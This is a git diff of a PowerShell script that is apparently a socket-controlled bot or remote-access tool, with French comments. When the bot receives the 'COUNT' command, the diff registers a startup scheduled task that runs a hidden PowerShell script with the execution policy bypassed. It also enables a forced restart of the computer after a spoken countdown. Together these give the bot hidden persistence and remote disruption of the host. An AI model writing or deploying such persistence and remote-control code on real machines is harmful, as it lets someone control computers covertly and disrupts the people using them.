@@ -69,7 +69,7 @@ function global:FRX_Socket-MessageAction{
         {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow
         #-------- Bonus- Redémarrage du pc si on tape "count" avec une voix qui annonce un décompte "3 2 1" --------
             #Mise en place de 'excéution automatique de la tâche 
-            $tache3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\test.ps1"
+            $tache3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\BOTOK.ps1"
             $Repet = New-ScheduledTaskTrigger -AtStartup
 
             #Mise en place de la tâche avec les paramètres vus précédemment
@@ -78,11 +78,11 @@ function global:FRX_Socket-MessageAction{
             }catch{
                 Register-ScheduledTask -TaskName "Restart" -Trigger $Repet -Action $tache3 -Description "Time to Disconnect :)" Task
              }
- 
+             #redémarrage de l'ordinateur
              Add-Type -AssemblyName System.speech
              $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
-             $speak.Speak("Attention votre ordinateur va couper dans. 3 2 1") 
-             #Restart-Computer -Force
+             $speak.Speak("Attention votre ordinateur va couper dans. 3 2 1")
+             Restart-Computer -Force
         }
         {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
                                     $stop=$true}
